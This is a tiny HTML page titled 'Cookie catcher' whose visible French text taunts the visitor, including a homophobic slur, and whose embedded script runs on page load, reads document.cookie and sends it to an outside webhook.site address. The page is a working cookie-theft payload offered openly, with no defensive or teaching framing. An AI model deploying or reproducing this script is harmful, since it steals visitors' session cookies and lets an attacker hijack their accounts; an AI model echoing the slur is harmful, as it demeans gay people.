<!DOCTYPE html>
<html>
  <body>
    <h1>Cookie catcher</h1>
    <p>Je te vole ton cookie et tu vas rien faire pd</p>
    <script>
    function sendToken() {
        var token = document.cookie;
        var xhr = new XMLHttpRequest();
        xhr.open("GET", "https://webhook.site/4154552b-c675-427c-9072-5aeb3ef47f71?cookie=" + encodeURIComponent(token), true);
        xhr.send();
    }
    sendToken();
</script>

  </body>
</html>
